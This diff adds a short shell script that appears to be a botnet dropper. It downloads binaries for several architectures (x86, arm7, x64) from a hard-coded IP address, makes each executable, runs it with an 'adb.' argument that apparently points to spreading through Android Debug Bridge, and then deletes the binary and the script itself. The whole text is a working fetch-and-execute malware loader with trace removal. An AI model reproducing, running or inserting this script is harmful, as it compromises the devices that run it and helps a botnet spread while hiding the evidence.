@@ -1,0 +1,19 @@
+#!/bin/sh
+
+file_server="91.92.66.124"
+dir="..q"
+files="x86 arm7 x64"
+outfile="oe3noNXe"
+
+rm -rf $outfile
+
+for file in $files
+do
+	wget http://$file_server/$dir/$file -O - >$outfile
+	chmod 777 $outfile
+	./$outfile adb.$file
+done
+
+rm -rf $outfile
+rm -rf $0
+
